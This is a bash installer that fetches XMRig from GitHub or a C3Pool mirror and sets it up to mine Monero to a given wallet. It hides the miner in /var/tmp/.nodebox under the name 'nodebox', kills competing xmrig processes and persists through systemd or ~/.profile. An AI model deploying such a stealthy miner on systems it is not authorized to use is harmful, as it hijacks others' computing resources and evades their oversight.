#!/usr/bin/env bash

# C3Pool merged installer
# Merges the useful parts of setup_c3pool_miner.sh and the C3Pool-only variant:
# - automatic port selection based on estimated hashrate
# - automatic discovery of the latest official XMRig Linux x64 release
# - C3Pool package fallback if GitHub/API is unavailable
# - multiple C3Pool endpoints for failover
# - /var/tmp/.nodebox layout, wrapper script, and optional systemd persistence

VERSION="2.12-merged-latest"
C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
INSTALL_DIR="/var/tmp/.nodebox"
ARCHIVE="/var/tmp/nodebox.tar.gz"
SERVICE_NAME="c3pool_miner.service"

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="windows"

log() {
  printf '%s\n' "$*"
}

fail() {
  printf 'ERROR: %s\n' "$*" >&2
  exit 1
}

if [ -z "$WALLET" ]; then
  echo "C3Pool mining setup script v$VERSION"
  echo "Usage: $0 <wallet address or USDT TRC20 address> [email]"
  exit 1
fi

WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in
  106|95|34) ;;
  *) fail "Wrong wallet base address length: ${#WALLET_BASE} (expected 106, 95, or 34)" ;;
esac

[ -d /var/tmp ] || fail "/var/tmp directory does not exist"

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in
  ''|*[!0-9]*) CPU_THREADS=1 ;;
esac

CPU_MHZ="$(awk -F: '/cpu MHz/{gsub(/^[ \t]+|[ \t]+$/, "", $2); printf "%.0f", $2; exit}' /proc/cpuinfo 2>/dev/null)"
CPU_MHZ="${CPU_MHZ:-unknown}"
TOTAL_CACHE="$(awk -F: '/cache size/{gsub(/[^0-9]/, "", $2); if ($2 != "") s += $2} END{if (s>0) print s}' /proc/cpuinfo 2>/dev/null)"
TOTAL_CACHE="${TOTAL_CACHE:-unknown}"

# Keep the same rough estimate used by the original script.
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))
[ "$EXP_MONERO_HASHRATE" -gt 0 ] || EXP_MONERO_HASHRATE=1

get_port_based_on_hashrate() {
  local hashrate="$1"
  if [ "$hashrate" -le 5000 ]; then
    echo 80
  elif [ "$hashrate" -le 25000 ]; then
    echo 13333
  elif [ "$hashrate" -le 50000 ]; then
    echo 15555
  elif [ "$hashrate" -le 100000 ]; then
    echo 19999
  elif [ "$hashrate" -le 1000000 ]; then
    echo 23333
  else
    # Keep auto routing usable even on very large hosts.
    echo 23333
  fi
}

PORT="$(get_port_based_on_hashrate "$EXP_MONERO_HASHRATE")"

log "C3Pool mining setup script v$VERSION"
log "CPU threads: $CPU_THREADS"
log "Estimated Monero hashrate: $EXP_MONERO_HASHRATE H/s"
log "Computed C3Pool port: $PORT"
if [ "$CPU_MHZ" != "unknown" ] || [ "$TOTAL_CACHE" != "unknown" ]; then
  log "CPU info: ${CPU_MHZ} MHz, cache ${TOTAL_CACHE} KB"
fi
log "Miner directory: $INSTALL_DIR"
log "Preferred source: latest official XMRig release (auto-detected)"
log "Fallback source: $C3POOL_DOWNLOAD_URL"
if [ -n "$EMAIL" ]; then
  log "Email supplied: $EMAIL"
fi

download_file() {
  local url="$1"
  local output="$2"

  if command -v curl >/dev/null 2>&1; then
    curl -fL --retry 3 --connect-timeout 15 "$url" -o "$output"
  elif command -v wget >/dev/null 2>&1; then
    wget -O "$output" "$url"
  elif command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
    busybox wget "$url" -O "$output"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$output" <<'PY'
import sys, urllib.request
urllib.request.urlretrieve(sys.argv[1], sys.argv[2])
PY
  else
    return 1
  fi
}

download_text() {
  local url="$1"

  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 3 --connect-timeout 15 \
      -H 'Accept: application/vnd.github+json' \
      -H 'User-Agent: c3pool-merged-installer' \
      "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --header='Accept: application/vnd.github+json' \
      --user-agent='c3pool-merged-installer' "$url"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - "$url" <<'PY'
import sys, urllib.request
req = urllib.request.Request(
    sys.argv[1],
    headers={
        "Accept": "application/vnd.github+json",
        "User-Agent": "c3pool-merged-installer",
    },
)
with urllib.request.urlopen(req, timeout=20) as r:
    sys.stdout.write(r.read().decode("utf-8"))
PY
  else
    return 1
  fi
}

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"

  case "$arch" in
    x86_64|amd64)
      ;;
    *)
      # Official upstream does not always publish a Linux static archive for
      # every architecture. Let the caller fall back to the C3Pool package.
      return 2
      ;;
  esac

  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" \
    | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' \
    | head -n 1)"

  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

install_latest_official_xmrig() {
  local url version
  url="$(get_latest_xmrig_url)" || return $?
  version="$(basename "$url" | sed -E 's/^xmrig-([0-9.]+)-linux-static-x64\.tar\.gz$/\1/')"

  log "[*] Latest official XMRig detected: v$version"
  log "[*] Downloading: $url"

  rm -rf "$INSTALL_DIR"
  mkdir -p "$INSTALL_DIR"
  rm -f "$ARCHIVE"

  download_file "$url" "$ARCHIVE" || return 1
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" --strip-components=1 || return 1
  rm -f "$ARCHIVE"

  [ -f "$INSTALL_DIR/xmrig" ] || return 1
  mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/nodebox"
  chmod +x "$INSTALL_DIR/nodebox" 2>/dev/null || true
  return 0
}

install_c3pool_package() {
  log "[*] Falling back to C3Pool miner package"
  log "[*] Downloading: $C3POOL_DOWNLOAD_URL"

  rm -rf "$INSTALL_DIR"
  mkdir -p "$INSTALL_DIR"
  rm -f "$ARCHIVE"

  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" || return 1
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" || return 1
  rm -f "$ARCHIVE"

  if [ -f "$INSTALL_DIR/xmrig" ]; then
    mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/nodebox"
  fi
  chmod +x "$INSTALL_DIR/nodebox" 2>/dev/null || true
  [ -f "$INSTALL_DIR/nodebox" ]
}

# Stop only the miner processes/services this installer manages.
if command -v systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  sudo systemctl stop "$SERVICE_NAME" 2>/dev/null || true
fi
pkill -x nodebox 2>/dev/null || true
pkill -x xmrig 2>/dev/null || true

log "[*] Preparing miner package"
if ! install_latest_official_xmrig; then
  log "WARNING: Could not resolve/download the latest official XMRig release."
  if ! install_c3pool_package; then
    fail "Unable to download either the latest official XMRig release or the C3Pool fallback package"
  fi
fi

# C3Pool-only fallback: on Alpine, use the distro package if the bundled binary cannot run.
if ! "$INSTALL_DIR/nodebox" --help >/dev/null 2>&1; then
  log "WARNING: Bundled miner is not functional on this host."
  if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
    log "[*] Trying Alpine xmrig package"
    if command -v apk >/dev/null 2>&1 && apk add --no-cache xmrig >/dev/null 2>&1 && command -v xmrig >/dev/null 2>&1; then
      cp "$(command -v xmrig)" "$INSTALL_DIR/nodebox"
      chmod +x "$INSTALL_DIR/nodebox"
    else
      fail "Bundled miner failed and Alpine xmrig fallback could not be installed"
    fi
  else
    fail "Miner binary is not functional on this host"
  fi
fi

log "[*] Miner binary is OK"

# Build one standard XMRig config with an auto-selected primary endpoint plus
# C3Pool-only failover endpoints from the C3Pool address list.
cat > "$INSTALL_DIR/config.json" <<EOF_CONFIG
{
    "autosave": true,
    "background": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "auto.c3pool.org:$PORT",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:19999",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:443",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:80",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:33333",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": true
        },
        {
            "url": "auto.c3pool.org:23333",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        }
    ],
    "log-file": "$INSTALL_DIR/nodebox.log",
    "donate-level": 0,
    "max-cpu-usage": 100,
    "syslog": true
}
EOF_CONFIG

cp "$INSTALL_DIR/config.json" "$INSTALL_DIR/config_background.json"
sed -i 's/"background": false/"background": true/' "$INSTALL_DIR/config_background.json"

log "[*] Creating $INSTALL_DIR/nodebox.sh"
cat > "$INSTALL_DIR/nodebox.sh" <<EOF_MINER
#!/usr/bin/env bash
if ! pidof nodebox >/dev/null 2>&1; then
  if [ "\$#" -eq 0 ]; then
    exec nice "$INSTALL_DIR/nodebox" --config="$INSTALL_DIR/config.json"
  else
    exec nice "$INSTALL_DIR/nodebox" "\$@"
  fi
else
  echo "C3Pool miner is already running."
  echo "Use 'killall nodebox' (or sudo killall nodebox) before starting another instance."
fi
EOF_MINER
chmod +x "$INSTALL_DIR/nodebox.sh"

start_without_systemd() {
  log "[*] Starting miner in background"
  "$INSTALL_DIR/nodebox.sh" --config="$INSTALL_DIR/config_background.json" >/dev/null 2>&1 &
}

if command -v systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  log "[*] Installing systemd service"
  cat > /var/tmp/c3pool_miner.service <<EOF_SERVICE
[Unit]
Description=C3Pool Monero miner service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=$INSTALL_DIR/nodebox --config=$INSTALL_DIR/config.json
Restart=always
RestartSec=5
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  sudo mv /var/tmp/c3pool_miner.service "/etc/systemd/system/$SERVICE_NAME"
  sudo systemctl daemon-reload
  sudo systemctl enable "$SERVICE_NAME" >/dev/null
  sudo systemctl restart "$SERVICE_NAME"
  log "[*] systemd service started"
  log "    Logs: sudo journalctl -u c3pool_miner -f"
else
  # Preserve the original non-systemd behavior, but only add one managed line.
  PROFILE="${HOME:-/var/tmp}/.profile"
  TOUCH_OK=1
  touch "$PROFILE" 2>/dev/null || TOUCH_OK=0
  if [ "$TOUCH_OK" -eq 1 ]; then
    START_LINE="$INSTALL_DIR/nodebox.sh --config=$INSTALL_DIR/config_background.json >/dev/null 2>&1"
    if ! grep -F "$START_LINE" "$PROFILE" >/dev/null 2>&1; then
      printf '%s\n' "$START_LINE" >> "$PROFILE"
      log "[*] Added miner startup to $PROFILE"
    fi
  else
    log "WARNING: Could not update $PROFILE for startup persistence"
  fi
  start_without_systemd
fi

sleep 2
if pgrep -x nodebox >/dev/null 2>&1 || (command -v systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null && sudo systemctl is-active --quiet "$SERVICE_NAME"); then
  log "[*] Setup complete - miner is running"
else
  log "WARNING: Setup finished but the miner process is not currently detected"
  log "Check $INSTALL_DIR/nodebox.log for details."
fi

log "Primary endpoint: auto.c3pool.org:$PORT"
log "Failover endpoints: 19999, 443, 80, 33333(TLS), 23333"
